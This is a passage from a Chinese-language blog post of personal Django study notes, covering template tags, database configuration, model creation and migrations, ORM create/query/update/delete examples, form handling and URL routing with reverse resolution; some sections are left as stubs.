views_list&#125;)<br></code></pre></td></tr></table></figure><p>如果要引用dict类型用以下代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% for i,j in views_dict.items %&#125;<br>&#123;&#123; i &#125;&#125;---&#123;&#123; j &#125;&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_dict = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;菜鸟教程&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;views_dict&quot;</span>: views_dict&#125;)<br></code></pre></td></tr></table></figure><p>在<code> &#123;% for %&#125;</code> 标签里可以通过<code>&#123;&#123;forloop&#125;&#125;</code>变量获取循环序号。</p><ul><li>forloop.counter: 顺序获取循环序号，从 1 开始计算</li><li>forloop.counter0: 顺序获取循环序号，从 0 开始计算</li><li>forloop.revcounter: 倒叙获取循环序号，结尾序号为 1</li><li>forloop.revcounter0: 倒叙获取循环序号，结尾序号为 0</li><li>forloop.first（一般配合if标签使用）: 第一条数据返回 True，其他数据返回 False</li><li>forloop.last（一般配合if标签使用）: 最后一条数据返回 True，其他数据返回 False</li></ul><p>再例如对于for的使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% for i in listvar %&#125;<br>    &#123;&#123; forloop.counter &#125;&#125;<br>    &#123;&#123; forloop.counter0 &#125;&#125;<br>    &#123;&#123; forloop.revcounter &#125;&#125;<br>    &#123;&#123; forloop.revcounter0 &#125;&#125;<br>    &#123;&#123; forloop.first &#125;&#125;<br>    &#123;&#123; forloop.last &#125;&#125;<br>&#123;% empty %&#125;<br>&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>     views_list = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>]<br>     <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;listvar&quot;</span>: views_list&#125;)<br></code></pre></td></tr></table></figure><p>可选的 <code>&#123;% empty %&#125;</code> 从句：在循环为空的时候执行（即 in 后面的参数布尔值为 False ）</p><h3 id="ifequal-x2F-ifnotequal-标签"><a href="#ifequal-x2F-ifnotequal-标签" class="headerlink" title="ifequal&#x2F;ifnotequal 标签"></a>ifequal&#x2F;ifnotequal 标签</h3><p>百度把</p><h3 id="注释标签"><a href="#注释标签" class="headerlink" title="注释标签"></a>注释标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;# 这是一个注释 #&#125;<br></code></pre></td></tr></table></figure><h3 id="include-标签"><a href="#include-标签" class="headerlink" title="include 标签"></a>include 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% include &quot;nav.html&quot; %&#125;<br></code></pre></td></tr></table></figure><h3 id="csrf-token"><a href="#csrf-token" class="headerlink" title="csrf_token"></a>csrf_token</h3><p>百度</p><h3 id="自定义标签和过滤器"><a href="#自定义标签和过滤器" class="headerlink" title="自定义标签和过滤器"></a>自定义标签和过滤器</h3><p>百度</p><h3 id="配置静态文件"><a href="#配置静态文件" class="headerlink" title="配置静态文件"></a>配置静态文件</h3><p>百度</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><ol><li>建立数据库的基本步骤:setting.py配置(设置user,password,host.etc)</li><li>修改setting.py同目录下的__init__.py(用pymysql来代替mysqlclient)</li><li>创建app(没有这个就无法使用数据库)</li><li>修改model添加一个类(这个类就是建立一个表)</li><li>在setting.py中添加app(用来引入这个app)</li><li>修改urls.py(创建请求映射)</li><li>创建响应函数(创建请求对应的函数)</li></ol><p>在第5条建立完成后</p><blockquote><p>py manage.py migrate</p></blockquote><p>来创建一个数据库</p><p>支持的数据库</p><ul><li><p>CockroachDB </p></li><li><p>Firebird </p></li><li><p>Microsoft SQL Server</p></li></ul><h3 id="setting中的database设置"><a href="#setting中的database设置" class="headerlink" title="setting中的database设置:"></a>setting中的database设置:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">DATABASES = &#123;     <br>    <span class="hljs-string">&#x27;default&#x27;</span>: <br>    &#123;<br>            <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.sqlite3&#x27;</span>,         <br>        <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;mydatabase&#x27;</span>,     <br>        &#125; <br>&#125;<br><span class="hljs-comment">#ENGINE参数可以设置如下</span><br><span class="hljs-comment">#django.db.backends.sqlite3 </span><br><span class="hljs-comment">#django.db.backends.postgresql</span><br><span class="hljs-comment">#django.db.backends.mysql</span><br><span class="hljs-comment">#django.db.backends.oracle</span><br><br><br><span class="hljs-comment">#NAME parameter of official description:</span><br><span class="hljs-comment">#official:The name of your database. If you’re using SQLite, the database will be a file on your computer; #in that case, NAME should be the full absolute path, including filename, of that file. The default value, #BASE_DIR / &#x27;db.sqlite3&#x27;, will store the file in your project directory.</span><br></code></pre></td></tr></table></figure><p>如果没有使用SQLite 作为数据库就要设置USER,PASSWORD,HOST.For more details,for example</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">DATABASES = &#123;     <br>    <span class="hljs-string">&#x27;default&#x27;</span>: &#123;         <br>        <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.mysql&#x27;</span>,    <span class="hljs-comment"># 数据库引擎         </span><br>        <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-comment"># 数据库名称         </span><br>        <span class="hljs-string">&#x27;HOST&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-comment"># 数据库地址，本机 ip 地址 127.0.0.1          </span><br>        <span class="hljs-string">&#x27;PORT&#x27;</span>: <span class="hljs-number">3306</span>, <span class="hljs-comment"># 端口          </span><br>        <span class="hljs-string">&#x27;USER&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>,  <span class="hljs-comment"># 数据库用户名         </span><br>        <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>, <span class="hljs-comment"># 数据库密码  </span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接下来需要告诉Django链接的mysql数据库"><a href="#接下来需要告诉Django链接的mysql数据库" class="headerlink" title="接下来需要告诉Django链接的mysql数据库"></a>接下来需要告诉Django链接的mysql数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在与 settings.py 同级目录下的 __init__.py 中引入模块和进行配置 </span><br><span class="hljs-keyword">import</span> pymysql <br>pymysql.version_info = (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;final&quot;</span>, <span class="hljs-number">0</span>)<br>pymysql.install_as_MySQLdb()<br></code></pre></td></tr></table></figure><p>在使用模型之前必须建立一个app</p><h3 id="建立app"><a href="#建立app" class="headerlink" title="建立app"></a>建立app</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">django-<span class="hljs-literal">admin</span>.py startapp TestModel<br></code></pre></td></tr></table></figure><h3 id="在models-py中添加一个表-类"><a href="#在models-py中添加一个表-类" class="headerlink" title="在models.py中添加一个表(类)"></a>在models.py中添加一个表(类)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(models.Model):    <br>        name = models.CharField(max_length=<span class="hljs-number">20</span>)<br></code></pre></td></tr></table></figure><h3 id="然后在setting-py中修改INSTALLED-APPS中添加TestModel如"><a href="#然后在setting-py中修改INSTALLED-APPS中添加TestModel如" class="headerlink" title="然后在setting.py中修改INSTALLED_APPS中添加TestModel如:"></a>然后在setting.py中修改INSTALLED_APPS中添加TestModel如:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">INSTALLED_APPS = (     <br>    <span class="hljs-string">&#x27;django.contrib.admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.auth&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.contenttypes&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.sessions&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.messages&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.staticfiles&#x27;</span>,<br>    <span class="hljs-string">&#x27;TestModel&#x27;</span>,               <span class="hljs-comment"># 添加此项 </span><br>)<br></code></pre></td></tr></table></figure><p>然后建立对应的表</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>python3 manage.py migrate   <span class="hljs-comment"># 创建表结构  </span><br><span class="hljs-variable">$ </span>python3 manage.py makemigrations TestModel  <span class="hljs-comment"># 让 Django 知道我们在我们的模型有一些变更 </span><br><span class="hljs-variable">$ </span>python3 manage.py migrate TestModel   <span class="hljs-comment"># 创建表结构</span><br></code></pre></td></tr></table></figure><h3 id="添加请求响应解析在urls-py中"><a href="#添加请求响应解析在urls-py中" class="headerlink" title="添加请求响应解析在urls.py中"></a>添加请求响应解析在urls.py中</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&#x27;testdb/&#x27;</span>, testdb.testdb),<br></code></pre></td></tr></table></figure><h3 id="实现映射"><a href="#实现映射" class="headerlink" title="实现映射"></a>实现映射</h3><p>新建一个testdb.py里面写一个testdb函数</p><h3 id="for-Test-DATABASE"><a href="#for-Test-DATABASE" class="headerlink" title="for Test DATABASE"></a>for Test DATABASE</h3><p> the test databases are destroyed when all the tests have been executed.</p><p>执行完所有测试数据数据库将被销毁</p><p>使用test –keepdb保留到下次运行,如果不存在数据库将先创建任何迁移都将被应用</p><p>if a test run is forcefully interrupted</p><p>下次运行会请求是否保留上次中断的数据库,test –noinput .option to suppress that prompt and automatically destroy the database. </p><p>所有的test数据库前面都会加上_test</p><p>The following is an introduction to creating a database </p><p>the tests will use an in-memory database by default (i.e., the database will be created in memory, bypassing the filesystem entirely!). The TEST dictionary in DATABASES offers a number of settings to configure your test database. For example, if you want to use a different database name, specify NAME in the TEST dictionary for any given database in DATABASES.</p><p>对于用别的方式创建的数据库还需要提供user用户创建的权限</p><p>要对测试数据库的字符编码进行细粒度控制，请使用CHARSET TEST选项。 如果您使用的是MySQL，还可以使用COLLATION选项来控制测试数据库使用的特定排序规则。 有关这些及其他高级设置的详细信息，请参见设置文档。</p><h3 id="对数据的操作"><a href="#对数据的操作" class="headerlink" title="对数据的操作"></a>对数据的操作</h3><p>添加</p><p>1.方法一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> models<br><span class="hljs-comment">#导入数据库模板</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">request</span>):<br>    book = models.Book(title = <span class="hljs-string">&quot;菜鸟教程&quot;</span>,price=<span class="hljs-number">30</span>,public=<span class="hljs-string">&quot;菜鸟出版社&quot;</span>,pub_date=<span class="hljs-string">&quot;2008-8-8&quot;</span>)<br>    <span class="hljs-comment">#Book为models属于models.Model的子类,Book构造里面传递所有创建数据添加的值</span><br>    book.save()<br>    <span class="hljs-comment">#对数据进行存储</span><br></code></pre></td></tr></table></figure><p>2.方法二</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> models<br><span class="hljs-comment">#导入数据库模板</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">request</span>):<br>    models.Book.objects.create(title = <span class="hljs-string">&quot;菜鸟教程&quot;</span>,price=<span class="hljs-number">30</span>,public=<span class="hljs-string">&quot;菜鸟出版社&quot;</span>,pub_date=<span class="hljs-string">&quot;2008-8-8&quot;</span>)<br>    <span class="hljs-comment">#使用Book.objects.create来创建一个新的数据</span><br></code></pre></td></tr></table></figure><p>查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">testdb</span>(<span class="hljs-params">request</span>):     <br>    <span class="hljs-comment"># 初始化     </span><br>response = <span class="hljs-string">&quot;&quot;</span>     <br>    response1 = <span class="hljs-string">&quot;&quot;</span>               <br>    <span class="hljs-comment"># 通过objects这个模型管理器的all()获得所有数据行，相当于SQL中的SELECT * FROM </span><br>    <span class="hljs-built_in">list</span> = Test.objects.<span class="hljs-built_in">all</span>()             <br>    <span class="hljs-comment"># filter相当于SQL中的WHERE，可设置条件过滤结果     </span><br>    response2 = Test.objects.<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)           <br>    <span class="hljs-comment"># 获取单个对象     </span><br>    response3 = Test.objects.get(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)           <br>    <span class="hljs-comment"># 限制返回的数据 相当于 SQL 中的 OFFSET 0 LIMIT 2;     </span><br>    Test.objects.order_by(<span class="hljs-string">&#x27;name&#x27;</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]          <br>    <span class="hljs-comment">#数据排序     </span><br>    Test.objects.order_by(<span class="hljs-string">&quot;id&quot;</span>)          <br>    <span class="hljs-comment"># 上面的方法可以连锁使用     </span><br>    Test.objects.<span class="hljs-built_in">filter</span>(name=<span class="hljs-string">&quot;runoob&quot;</span>).order_by(<span class="hljs-string">&quot;id&quot;</span>)         <br>    <span class="hljs-comment"># 输出所有数据     </span><br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:         <br>        response1 += var.name + <span class="hljs-string">&quot; &quot;</span>     <br>    response = response1     <br>    <span class="hljs-comment">#这里如果想要取出表中的某一行或者某一列用(这里讲一下多组数据)</span><br>    <span class="hljs-comment">#由于all()返回的是一个可迭代对象所以用for每个都取出来然后用i.列名就可以查找输出每一个数据了(返回一个str类型)</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:         <br>        <span class="hljs-built_in">print</span>(i.<span class="hljs-built_in">id</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)         <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; &quot;</span>+i.name)<br>   <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span> + response + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><p>更新可以用updata或者用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse   <br><span class="hljs-keyword">from</span> TestModel.models <span class="hljs-keyword">import</span> Test   <br><span class="hljs-comment"># 数据库操作 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">testdb</span>(<span class="hljs-params">request</span>):     <br>    <span class="hljs-comment"># 修改其中一个id=1的name字段，再save，相当于SQL中的UPDATE     </span><br>    test1 = Test.objects.get(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)     <br>    test1.name = <span class="hljs-string">&#x27;Google&#x27;</span>     <br>    test1.save()          <br>    <span class="hljs-comment"># 另外一种方式     </span><br>    <span class="hljs-comment">#Test.objects.filter(id=1).update(name=&#x27;Google&#x27;)          </span><br>    <span class="hljs-comment"># 修改所有的列     </span><br>    <span class="hljs-comment"># Test.objects.all().update(name=&#x27;Google&#x27;)          </span><br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;&lt;p&gt;修改成功&lt;/p&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><p>删除数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse   <br><span class="hljs-keyword">from</span> TestModel.models <span class="hljs-keyword">import</span> Test   <br><span class="hljs-comment"># 数据库操作 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">testdb</span>(<span class="hljs-params">request</span>):     <br>    <span class="hljs-comment"># 删除id=1的数据     </span><br>    test1 = Test.objects.get(<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>)     <br>    test1.delete()          <br>    <span class="hljs-comment"># 另外一种方式     </span><br>    <span class="hljs-comment"># Test.objects.filter(id=1).delete()          </span><br>    <span class="hljs-comment"># 删除所有数据     </span><br>    <span class="hljs-comment"># Test.objects.all().delete()          </span><br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;&lt;p&gt;删除成功&lt;/p&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="单表"><a href="#单表" class="headerlink" title="单表"></a>单表</h3><h3 id="多表"><a href="#多表" class="headerlink" title="多表"></a>多表</h3><h3 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h3><h2 id="表单-amp-视图-amp-路由"><a href="#表单-amp-视图-amp-路由" class="headerlink" title="表单&amp;视图&amp;路由"></a>表单&amp;视图&amp;路由</h2><ul><li><p>GET方法</p></li><li><p>POST方法</p></li></ul><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">GET实现方式</span><br><span class="language-xml">默认使用方式为GET,HttpResponse,render,redirect</span><br><span class="language-xml">POST</span><br><span class="language-xml">用表单实现</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">csrf_token</span></span> %&#125;</span><span class="language-xml">这句话是用来保持链接的,目前只能用网页提交(一般POST由系统提交的意义不打)</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/search-post&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>         </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">csrf_token</span></span> %&#125;</span><span class="language-xml">         </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span>&gt;</span>         </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span>     </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><p>对于在views.py(视图)中的映射方法</p><p>方法中的request(数据类型为 QueryDict)解读:</p><p>可以使用&#x3D;&#x3D;对象.方法&#x3D;&#x3D;的方式来获取request的值</p><ul><li>GET如:request.GET.get(“name”)</li><li>POST如:request.POST.get(“name”)</li><li>body如:request.body</li><li>path如:request.path</li><li>method如:request.method</li></ul><p>HttpResponse 对象的形式:HttpResponse()、render()、redirect()</p><hr><p>urls.py中</p><p>在Django1.1.x 版本用url()函数(正则和自动填充)</p><p>Django 2.2.x 之后的版本分解为path()、re_path()</p><p>正则分组传递参数</p><p>1.无名分组</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">urlpatterns = [<br>path(<span class="hljs-string">&#x27;admin/&#x27;</span>, <span class="hljs-keyword">admin</span>.site.urls),<br>    re_path(&quot;^index/([0-9]&#123;4&#125;)/$&quot;, views.<span class="hljs-keyword">index</span>), <br>] <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <br><span class="hljs-keyword">import</span> HttpResponse  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request，year</span>):     <br>    <span class="hljs-built_in">print</span>(year) <span class="hljs-comment"># 一个形参代表路径中一个分组的内容，按顺序匹配     </span><br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>)<br></code></pre></td></tr></table></figure><p>2.有名分组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls),<br>    re_path(<span class="hljs-string">&quot;^index/(?P[0-9]&#123;4&#125;)/(?P[0-9]&#123;2&#125;)/$&quot;</span>, views.index),<br>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> HttpResponse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request, year, month</span>):<br>    <span class="hljs-built_in">print</span>(year,month) <span class="hljs-comment"># 一个形参代表路径中一个分组的内容，按关键字对应匹配</span><br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>)<br></code></pre></td></tr></table></figure><p>路由分发</p><p>当创建多个app时需要调用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path,include <span class="hljs-comment"># 从 django.urls 引入 include</span><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls),<br>    path(<span class="hljs-string">&quot;app01/&quot;</span>, include(<span class="hljs-string">&quot;app01.urls&quot;</span>)),<br>    path(<span class="hljs-string">&quot;app02/&quot;</span>, include(<span class="hljs-string">&quot;app02.urls&quot;</span>)),<br>]<br></code></pre></td></tr></table></figure><p>反向解析</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">path(&quot;login1/&quot;, views.<span class="hljs-keyword">login</span>, <span class="hljs-type">name</span>=&quot;login&quot;)<br></code></pre></td></tr></table></figure><p>这样就将login可以和前面的url绑定起来,直接使用login来进行重定向跳转这样以后修改url就不用修改很多源文件了</p><p>在views.py中如果要跳转要用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">redirect</span>(<span class="hljs-title">reverse</span>(<span class="hljs-string">&quot;login&quot;</span>))</span><br></code></pre></td></tr></table></figure><p>如果要提交表单到页面，利用 <code>&#123;% url "路由别名" %&#125; </code>反向解析如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&#123;% url &#x27;login&#x27; %&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>带有参数的反向解析</p><ul><li>无名</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">re_path(<span class="hljs-string">r&quot;^login/(?P[0-9]&#123;4&#125;)/$&quot;</span>, views.login, name=<span class="hljs-string">&quot;login&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>views.py中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&quot;login&quot;</span>,args=(<span class="hljs-number">10</span>,)))<br></code></pre></td></tr></table></figure><ul><li>有名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">re_path(<span class="hljs-string">r&quot;^login/(?P&lt;year&gt;[0-9]&#123;2&#125;)/&amp;&quot;</span>,views.login,name=<span class="hljs-string">&quot;login&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>views.py中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 